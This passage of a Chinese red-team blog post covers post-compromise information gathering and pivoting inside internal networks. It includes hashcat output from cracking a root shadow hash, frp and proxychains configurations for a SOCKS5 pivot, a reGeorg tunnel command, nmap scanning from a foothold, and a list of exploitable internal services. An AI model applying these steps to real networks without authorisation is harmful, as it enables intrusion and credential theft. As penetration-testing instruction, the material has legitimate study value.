+Watchdog: Temperature retain trigger disabled.
+
+<span class="k">*</span> Device <span class="c">#1: build_opts '-I /usr/share/hashcat/OpenCL -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=16 -D KERN_TYPE=1800 -D _unroll'</span>
+<span class="k">*</span> Device <span class="c">#1: Kernel m01800.8f866878.kernel not found in cache! Building may take a while...</span>
+
+</code></pre></div></div>
+<p>继续 :(</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>s]tatus <span class="o">[</span>p]ause <span class="o">[</span>r]esume <span class="o">[</span>b]ypass <span class="o">[</span>c]heckpoint <span class="o">[</span>q]uit <span class="o">=&gt;</span> Dictionary cache built:
+<span class="k">*</span> Filename..: /usr/share/john/password.lst
+<span class="k">*</span> Passwords.: 3559
+<span class="k">*</span> Bytes.....: 26325
+<span class="k">*</span> Keyspace..: 3559
+<span class="k">*</span> Runtime...: 0 secs
+
+- Device <span class="c">#1: autotuned kernel-accel to 128</span>
+- Device <span class="c">#1: autotuned kernel-loops to 128</span>
+<span class="o">[</span>s]tatus <span class="o">[</span>p]ause <span class="o">[</span>r]esume <span class="o">[</span>b]ypass <span class="o">[</span>c]heckpoint <span class="o">[</span>q]uit <span class="o">=&gt;</span> <span class="o">[</span>s]tatus <span class="o">[</span>p]ause <span class="o">[</span>r]esume <span class="o">[</span>b]ypass <span class="o">[</span>c]heckpoApproaching final keyspace - workload adjusted.
+
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Type........: sha512crypt <span class="nv">$6$,</span> SHA512 <span class="o">(</span>Unix<span class="o">)</span>
+Hash.Target......: linux-root.txt
+Time.Started.....: Mon Jun  8 11:29:25 2020 <span class="o">(</span>23 secs<span class="o">)</span>
+Time.Estimated...: Mon Jun  8 11:29:48 2020 <span class="o">(</span>0 secs<span class="o">)</span>
+Guess.Base.......: File <span class="o">(</span>/usr/share/john/password.lst<span class="o">)</span>
+Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
+Speed.Dev.#1.....:      311 H/s <span class="o">(</span>8.82ms<span class="o">)</span>
+Recovered........: 0/2 <span class="o">(</span>0.00%<span class="o">)</span> Digests, 0/2 <span class="o">(</span>0.00%<span class="o">)</span> Salts
+Progress.........: 7118/7118 <span class="o">(</span>100.00%<span class="o">)</span>
+Rejected.........: 0/7118 <span class="o">(</span>0.00%<span class="o">)</span>
+Restore.Point....: 3559/3559 <span class="o">(</span>100.00%<span class="o">)</span>
+Candidates.#1....: doom2 -&gt; sss
+HWMon.Dev.#1.....: N/A
+
+Started: Mon Jun  8 11:28:50 2020
+Stopped: Mon Jun  8 11:29:49 2020
+</code></pre></div></div>
+
+<h3 id="0x03运维机器信息搜集">0x03：运维机器信息搜集</h3>
+
+<p>头脑风暴中…（没有遇到，有再更新）</p>
+<ul>
+  <li>密码复用</li>
+  <li>常见运维平台及服务的漏洞利用
+    <ul>
+      <li>zabbix agent</li>
+      <li>堡垒机</li>
+      <li>…</li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="一局域网里的信息搜集">一：局域网里的信息搜集</h2>
+
+<h3 id="1x01跳板机攻击">1x01：跳板机攻击</h3>
+<p>这一小节提出的意思是：跳板机上的<code class="language-plaintext highlighter-rouge">公网暴露</code>和<code class="language-plaintext highlighter-rouge">内网暴露</code>。
+如：</p>
+<ul>
+  <li>各种数据库 mysql、oracle、postgresql仅内网开放</li>
+  <li>区别在于：<code class="language-plaintext highlighter-rouge">bind addr</code> = <code class="language-plaintext highlighter-rouge">0.0.0.0 or 127.0.0.1</code></li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report <span class="k">for</span> <span class="o">(</span>inside_ip_addr<span class="o">)</span>
+
+20893/tcp open  textui       Alibaba Dubbo remoting telnetd
+</code></pre></div></div>
+<p>显而易见，内网里的Dubbo，反序列化走一波。</p>
+
+<h3 id="1x02内网代理">1x02：内网代理</h3>
+
+<p>内网代理，顾名思义就是我们自己可控的本机，通过各种代理方法（s5、s4），把拿下的内网服务器当作流量转发的一个中间跳板，对内网进行一系列我们想做的事情。这种情况下，我们的代理机器在内网没有具体的一个身份，只是我们通过代理的方式把我们对内网所发出的流量通过内网可控服务器向内网进行请求。</p>
+
+<p>极力推荐。挂了代理就已经进入了内网，十分方便。只需要配置vps（frps）端，拿下shell后下载frpc客户端，启动服务就可以。下面顺便贴上server端和client端的配置文件:</p>
+
+<ul>
+  <li><strong>frp server:</strong></li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>frp/frps.ini 
+<span class="o">[</span>common]
+<span class="c"># vps代理TCP监听端口</span>
+bind_port <span class="o">=</span> 7000
+
+<span class="c"># 授权码，请改成更复杂的</span>
+token <span class="o">=</span> <span class="o">{</span>your token<span class="o">}</span>
+
+<span class="c"># frp管理后台端口，请按自己需求更改</span>
+dashboard_port <span class="o">=</span> 7500
+<span class="c"># frp管理后台用户名和密码，请改成自己的</span>
+dashboard_user <span class="o">=</span> <span class="o">{</span>your admin username<span class="o">}</span>
+dashboard_pwd <span class="o">=</span> <span class="o">{</span>your admin password<span class="o">}</span>
+enable_prometheus <span class="o">=</span> <span class="nb">true</span>
+
+<span class="c"># frp日志配置</span>
+log_file <span class="o">=</span> /var/log/frps.log
+log_level <span class="o">=</span> info
+log_max_days <span class="o">=</span> 3
+
+<span class="c">#启动vps frps端</span>
+<span class="nv">$ </span>./frps <span class="nt">-c</span> frps.ini
+</code></pre></div></div>
+<ul>
+  <li><strong>frp clients（被代理客户端，可以称为跳板机）:</strong></li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>s5_jsccs.ini 
+<span class="o">[</span>common]
+server_addr <span class="o">=</span> <span class="o">{</span>your vps ip<span class="o">}</span>
+server_port <span class="o">=</span> 7000
+<span class="nv">token</span><span class="o">=</span> <span class="o">{</span>your token<span class="o">}</span>
+
+<span class="c">#此处可以自定义标签-dashboard面板proxies父栏对应的name={target}，{target}示例：s5_in_JStelecom</span>
+<span class="o">[{</span>target<span class="o">}]</span>
+<span class="nb">type</span> <span class="o">=</span> tcp
+remote_port <span class="o">=</span> 10010
+plugin <span class="o">=</span> socks5
+plugin_user <span class="o">=</span> <span class="o">{</span>your connect username<span class="o">}</span>
+plugin_passwd <span class="o">=</span> <span class="o">{</span>your connect password<span class="o">}</span>
+use_encryption <span class="o">=</span> <span class="nb">true
+</span>use_compression <span class="o">=</span> <span class="nb">true</span>
+</code></pre></div></div>
+
+<ul>
+  <li><strong>client（代理进内网客户端，可以称为攻击机器）</strong>
+    <ul>
+      <li>1.proxifier（支持mac、windows）配置自定义：
+        <ul>
+          <li>server_addr = {your vps ip}</li>
+          <li>server_port = 7000</li>
+          <li>plugin = socks5</li>
+          <li>plugin_user = {your connect username}</li>
+          <li>plugin_passwd = {your connect password}</li>
+        </ul>
+      </li>
+      <li>2.proxychains4 (linux、mac)配置<code class="language-plaintext highlighter-rouge">/etc/proxychains.conf</code>文件：
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="o">[</span>ProxyList]
+  <span class="c"># add proxy here ...</span>
+  <span class="c"># meanwile</span>
+  <span class="c"># defaults set to "tor"</span>
+  <span class="c"># socks4        127.0.0.1 9050</span>
+
+  <span class="c">#socks5 127.0.0.1 1081</span>
+  socks5  <span class="o">{</span>your vps ip<span class="o">}</span>   <span class="o">{</span>your vps port<span class="o">}</span>    <span class="o">{</span>your connect username<span class="o">}</span>   <span class="o">{</span>your connect password<span class="o">}</span>
+  <span class="c"># burp suite proxy</span>
+  <span class="c">#http 127.0.0.1 12344</span>
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<p>应用即可。<code class="language-plaintext highlighter-rouge">proxychains4 curl http://{target.ip}:{target.port}/</code>命令进行内网访问，一般可以通过命令行进行海德拉批量口令爆破，若需GUI进行浏览器访问可使用<code class="language-plaintext highlighter-rouge">proxifier</code>进行全局代理进行web访问。</p>
+
+<h3 id="1x03内网穿透">1x03：内网穿透</h3>
+
+<p>在写之前我们需要明确一点，就是我们所需要的内网目标是什么？
+而内网穿透和内网代理的分别在哪里？
+在什么情况我们需要做内网穿透，什么时候我们需要做内网代理？</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 reGeorgSocksProxy.py <span class="nt">-p</span> 9999 <span class="nt">-l</span> 0.0.0.0 <span class="nt">-u</span> https://www.pgyer.com/tunnel.nosocket.php
+</code></pre></div></div>
+
+<p>内网穿透就是针对一个机器下的某一个特定端口，通过流量转发的形式把端口暴露在公网上，举个例子，我们拿下了一个linux机器，很巧这个机器是运维机器，我们发现了大量的运维账号密码。
+又然后，发现windows的远程登录服务即3389端口，所以我们在这个时候可以使用端口服务转发的技巧，把端口流量转发到一个我们可控公网的端口上（如33890），那么我们在对我们自己可控公网的端口上进行数据请求的时候，就是在对这个windows机器的数据请求，所以我们可以很轻松的使用我们的到的账号和密码来连接对应的windows机器。</p>
+
+<p>所以我们做内网穿透的最终目的，很显然是：
+我们在已知某个内网服务器的敏感信息（如3389远程连接账号密码、3306连接账号密码），而我们在内网又无法使用windows机器远程连接、mysql-client软件对我们所得到的信息进行明确验证时，那么这个时候我们可以使用内网穿透即流量转发的手段来进行进一步验证。</p>
+
+<h3 id="1x04内网信息搜集技巧">1x04：内网信息搜集技巧</h3>
+<h4 id="-nmap"># nmap</h4>
+<p>由此拿到web服务器的权限后，msf死活都连不上，就无法进行内网扫描，查资料后可以：</p>
+
+<ul>
+  <li>跳板机（非root权限）本地编译安装nmap：</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://nmap.org/dist/nmap-7.40.tar.bz2
+bzip2 <span class="nt">-cd</span> nmap-7.40.tar.bz2 | <span class="nb">tar </span>xvf -
+<span class="nb">cd </span>nmap-7.40
+./configure
+<span class="nb">echo</span> <span class="nv">$?</span>
+make <span class="o">&amp;&amp;</span> make <span class="nb">install
+</span>noohup ./nmap <span class="nt">-p-</span> <span class="nt">-T4</span> <span class="nt">-A</span> 192.168.0.0/24 &amp;
+</code></pre></div></div>
+
+<ul>
+  <li>Cobalt Strike 插件扫描</li>
+</ul>
+
+<h2 id="二典型案例剖析">二：典型案例剖析</h2>
+
+<ul>
+  <li>Elastic Search
+    <ul>
+      <li>RCE</li>
+      <li>敏感信息</li>
+      <li>nday…</li>
+    </ul>
+  </li>
+  <li>Zabbix
+    <ul>
+      <li>弱口令</li>
+      <li>SQL注入</li>
+      <li>nday…</li>
+    </ul>
+  </li>
+  <li>ActiveMQ
+    <ul>
+      <li>basic认证弱口令</li>
+      <li>ActiveMQ 反序列化漏洞（CVE-2015-5254）</li>
+      <li>PUT &amp; MOVE方法写入shell</li>
+    </ul>
+  </li>
+  <li>Hystrix
+    <ul>
+      <li>ssrf
+        <ul>
+          <li>http://ip:6855/proxy.stream?origin=http://www.baidu.com</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>redis
+    <ul>
+      <li>未授权写入crontab计划</li>
+    </ul>
+  </li>
+  <li>shiro
+    <ul>
+      <li>shiro550 &amp; 721 rememberMe反序列化</li>
+    </ul>
+  </li>
+  <li>struts2
+    <ul>
+      <li>s2-{01-61}</li>
+    </ul>
+  </li>
+  <li>…
+其实总结下来内网里有很多可以利用的，还是要具体问题具体分析才能更好的在内网“遨游”。</li>
+</ul>
+
+<h2 id="总结">总结</h2>
+
+<p><strong>总结下来，内网的信息收集需要的是细心。</strong></p>
+
+<h2 id="参考">参考</h2>
+
+<ul>
+  <li><a href="https://apt404.github.io/2016/06/26/atived-machine-discovnery/">如何在目标内网中发现更多存活主机 [Arp,icmp,tcp/udp,smb,snmp …]</a></li>
+</ul>
+
+<p>以上。</p>
+
+                <!-- [x] 2022/10/20/10:49:36 fixed: while width < some inch. would be flex column not display like a row.-->
+<footer>
+	<style>.border-top {
+		border-top: 1.5px solid #d0d7de!important;
+	}</style>
+	<div class="border-top"></div>
+		<section class="container-xl mt-lg-8 mt-6 px-3 px-md-6 no-print mx-auto">
+			<div class="col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix ">
+				<h2 class="lead">申明</h2>
+				<div>
+					<div class="mb-2"><a href="/blog/2020/inside-internet-walk-through/" target="_blank" class=" text-bold">
+						<div class="fa fa-link"></div>
+						转载请申明本文档链接</a></div>
+					<div><a href="https://github.com/Bin4xin" target="_blank"  class="text-bold">
+						<div class="fa fa-user"></div>
+						Post by Bin4xin.</a>
+					</div>
+				</div>
+			</div>
+			<div class="col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix">
+				<h2 class="lead">贡献开源文档</h2>
+				<div>
+					<a href="https://github.com/Bin4xin/bin4xin.github.io/tree/main/_posts/blog/2020-06-08-inside-internet-walk-through.markdown" target="_blank" class="no-underline btn mr-1 color-border-accent-emphasis">
+						<svg aria-hidden="true" focusable="false" role="img" class="octicon mr-1" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" style="display: inline-block; user-select: none; vertical-align: text-bottom; overflow: visible;"><path fill-rule="evenodd" d="M7.177 3.073L9.573.677A.25.25 0 0110 .854v4.792a.25.25 0 01-.427.177L7.177 3.427a.25.25 0 010-.354zM3.75 2.5a.75.75 0 100 1.5.75.75 0 000-1.5zm-2.25.75a2.25 2.25 0 113 2.122v5.256a2.251 2.251 0 11-1.5 0V5.372A2.25 2.25 0 011.5 3.25zM11 2.5h-1V4h1a1 1 0 011 1v5.628a2.251 2.251 0 101.5 0V5A2.5 2.5 0 0011 2.5zm1 10.25a.75.75 0 111.5 0 .75.75 0 01-1.5 0zM3.75 12a.75.75 0 100 1.5.75.75 0 000-1.5z"></path></svg>
+						贡献当前开源文档
+					</a>
+					<p class="f0_8-l mt-2 text-bold">此之前，学习开源贡献<a target="_blank" href="https://github.com/Bin4xin/bin4xin.github.io/wiki/Git操作-Git如何贡献仓库代码">CN&nbsp;|</a>
+						<a target="_blank" href="https://github.com/github/docs/blob/main/CONTRIBUTING.md">EN</a></p>
+				</div>
+			</div>
+			<div class="col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix">
+				<h2 class="lead">此文档对您有帮助吗</h2>
+				<a href="https://github.com/Bin4xin/bin4xin.github.io/" target="_blank" class="no-underline">
+				<span class="btn mr-1 color-border-accent-emphasis" title="给文档仓库点个赞!">
+					<div class="fa fa-thumbs-o-up"></div>
+				</span>
+				</a>
+				<a href="https://github.com/Bin4xin/bin4xin.github.io/issues/new?labels=Service+Issue,research&template=2-bug_report.yaml&title=_posts/blog/2020-06-08-inside-internet-walk-through.markdown&nbsp; 「信息搜集」:漫谈一些在内网的信息搜集技巧 | © 哨兵 | SENTINEL SECURITY, LAB" target="_blank">
+				<span class="btn mr-1 color-border-accent-emphasis" title="本文档有问题?">
+				<div class="fa fa-thumbs-o-down"></div>
+				</span>
+				</a>
+			</div>
+		</section>
+</footer>
+            </div>
+            <div class="spacing"></div>
+        </div><!--/col-lg-8 -->
+        
+<div class="ml-hide article-index thin-scrollbar position-sticky top-0" style="max-height: 100vh; overflow-y: auto;">
+    <div class="nav nav-stacked tableOfContents_35-E">
+        <li class=" table-of-contents">
+            <code-index-css>
+                <ul><li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column"><a>文章目录</a></li></ul>
+                <ul id="toc" class="section-nav">
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2"><a href="#零在机器上的信息搜集">零：在机器上的信息搜集</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#0x01个人工作机器信息搜集">0x01：个人工作机器信息搜集</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#0x02web服务器信息搜集">0x02：WEB服务器信息搜集</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#-配置文件"># 配置文件</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#-bash_history"># bash_history</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#-一些自动化搜集脚本"># 一些自动化搜集脚本</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#-passwdshadow不推荐"># Passwd&amp;Shadow（不推荐）</a></li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#0x03运维机器信息搜集">0x03：运维机器信息搜集</a></li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2"><a href="#一局域网里的信息搜集">一：局域网里的信息搜集</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#1x01跳板机攻击">1x01：跳板机攻击</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#1x02内网代理">1x02：内网代理</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#1x03内网穿透">1x03：内网穿透</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#1x04内网信息搜集技巧">1x04：内网信息搜集技巧</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#-nmap"># nmap</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2"><a href="#二典型案例剖析">二：典型案例剖析</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2"><a href="#总结">总结</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2"><a href="#参考">参考</a></li>
+</ul>
+            </code-index-css>
+        </li>
+    </div>
+</div>
+
+
+    </div><!--/row -->
+</div><!--/container -->
+                <!-- 代码引用申明/code reference declaration:
+#############################################################################
+## code from cloudflare. visit footer in https://www.cloudflare.com/zh-cn/ ##
+#############################################################################
+-->
+
+<div id="footerwrap" class="hidden-print">
+    <div class="footer-container">
+        <div class="pt3 pt3-ns pt3-m pt7-l pb0 pb0-ns pb0-m pb5-l">
+            <div class="footer-row">
+                
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>入门</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/usage/" target="_blank">快速开始</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/blog/2019/jekyll/in/linux/" target="_blank">博客搭建</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/blog/2019/nginx/with/jekyll-site/" target="_blank">公网部署</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/tuna/mirror-web/" target="_blank">Jekyll Tuna源码</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>社区</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/Bin4xin/bigger-than-bigger/" target="_blank">Bigger than Bigger</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV" target="_blank">Collection Of Verified Vulnerabilities</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/Bin4xin/sweet-ysoserial" target="_blank">sweet-ysoserial</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>技术栈</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://jekyllrb.com/docs/" target="_blank">Jekyll</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://www.markdownguide.org/" target="_blank">MarkDown</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://www.cloudflare.com/waf/" target="_blank">CloudFlare WAF</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://dash.cloudflare.com/dns/" target="_blank">CloudFlare CDN</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/features/actions" target="_blank">Github Action</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>关于</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/about/" target="_blank">近期研究</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/blog/" target="_blank">博客</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/Bin4xin/bin4xin.github.io/wiki" target="_blank">WIKI</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>贡献者</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/bin4xin" target="_blank">本阿信</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/dnf-2008" target="_blank">夏天の风</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/Yang2635" target="_blank">Yang2635</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>其他</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/usage/" target="_blank">帮助</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/privacy/" target="_blank">隐私</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/privacy/#cookie" target="_blank">Cookie偏好</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+            </div><!-- "/row"-->
+            <!--TODO mark-->
+            <span class="btn mr-1 color-border-accent-emphasis" title="Under construction">
+					<div class="fa fa-bug">
+                        <div class="fa fa-hand-point-down"></div>
+                        <a href="https://github.com/Bin4xin/bin4xin.github.io/blob/main/.github/workflows/deploy.yml#L46" target="_blank">
+                        Clock counter Bug need to FIX.</a>
+                    </div>
+            </span>
+
+            <div class="pv2-ns">
+                <div class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l flex footer-bottom-row-margin">
+                    <!--
+   - FlipClock design
+   -    @link { https://github.com/objectivehtml/FlipClock }
+-->
+<link rel="stylesheet" href="/assets/flipclock/flipclock.css">
+<script src="/assets/flipclock/flipclock.js"></script>
+
+<div class="clock" style="margin-bottom:2em;margin-top:2em;"></div>
+<div class="flex items-center mb3 mb3-ns mb3-m mb0-l lh-1 mt0 mt3-ns" >
+    
+    
+    
+    <div id="SentinelLAB"><a class="lh-1 dib mr2" title="SentinelLAB" target="_blank" rel="noopener" href="https://www.vulbox.com/team/ERRORS"></a></div>
+    
+    
+    
+    <div id="YouTuBe"><a class="lh-1 dib mr2" title="YouTuBe" target="_blank" rel="noopener" href="https://www.youtube.com/@bin4xin"></a></div>
+    
+    
+    
+    <div id="Twitter"><a class="lh-1 dib mr2" title="Twitter" target="_blank" rel="noopener" href="https://twitter.com/bin4xin"></a></div>
+    
+    
+    
+    <div id="Linkedin"><a class="lh-1 dib mr2" title="Linkedin" target="_blank" rel="noopener" href="https://www.linkedin.com/#"></a></div>
+    
+    
+    
+    <div id="Facebook"><a class="lh-1 dib mr2" title="Facebook" target="_blank" rel="noopener" href="https://www.facebook.com/#"></a></div>
+    
+    
+    
+    <div id="Bilibili"><a class="lh-1 dib mr2" title="Bilibili" target="_blank" rel="noopener" href="https://space.bilibili.com/67373868"></a></div>
+    
+</div>
+<!--
+  - Ajax @para counts
+  - Jquery-return-value-undefined @link { https://stackoverflow.com/questions/13848123/jquery-return-value-undefined }
+  -->
+<script>
+    function getGAJson() {
+        let counts = null
+        $.ajax({
+            url: 'https://bin4xin.sentrylab.cn/assets/ga.json',
+            dataType: 'json', // for cross-origin access
+            timeout: 1000 * 10, // 10 secs
+            async: false,
+            success: function(data) { counts = displayPageviews(data.rows); },
+            error: function() { console.log('Failed to load Pageviews!'); }
+        });
+        return counts;
+    }
+    function displayPageviews(rows) {
+        if (rows === undefined) { return; }
+        var curPath = window.location.pathname;
+        var curFile = curPath.slice(curPath.lastIndexOf('/') + 1); // Sometimes posts will be moved.
+        var len = rows.length;
+        var cnt = 0;
+
+        for (var i = 0; i < len; ++i) {
+            var gaPath = rows[i][0];
+            var gaFile = gaPath.slice(gaPath.lastIndexOf('/') + 1);
+
+            if (gaPath === curPath || gaFile === curFile) {
+                cnt += parseInt(rows[i][1]);
+            }
+        }
+        return setInitialCount(cnt);
+        // ref @link
+        //      - { https://cotes.page/posts/fetch-pageviews-from-google-analytics/#web-%E7%AB%AF%E5%A4%84%E7%90%86-ga-%E6%95%B0%E6%8D%AE }
+        //      - { https://taoalpha.github.io/blog/2015/06/07/tech-add-google-analytics-pageviews-to-jekyll-blog/ }
+    }
+    // <!-- @link { https://profile-counter.glitch.me/bin4xin.github.io/count.svg } -->
+    function setInitialCount(num) {
+        var init_SiteOffset = 66749;
+        _value_site_pv = parseInt(num)
+        all_counts = init_SiteOffset + _value_site_pv
+        return all_counts
+    }
+    var clock;
+    let All_Counts = getGAJson()
+    $(document).ready(function() {
+            // Instantiate a counter
+            clock = new FlipClock($('.clock'), All_Counts , {
+            clockFace: 'Counter'
+        });
+        // Attach a click event to a button an increment the clock
+        $('.increment').click(function() {
+            //clock.setValue(10); Or you could decrease the clock // clock.decrement();
+            clock.increment();
+            // Or set it to a specific value
+            // clock.setValue(x);
+        });
+        // Attach a click event to a button a decrement the clock
+        $('.decrement').click(function() {
+            clock.decrement();
+        });
+        $('.reset').click(function() {
+            clock.reset();
+        });
+    });
+</script>
+                </div>
+            </div><!-- "/pv5" -->
+        </div>
+    </div>
+    <div class="tertiary d-flex">
+        <div class="wrapper">
+            <div class="col justify-center flex-wrap-l d-flex justify-content-center">
+                <ul class="pa1 table-of-contents flex-xl-justify-between flex-xl-column">
+                    <li class="outstanding"><a>© 2019-2025 SENTRYLAB.CN</a></li>
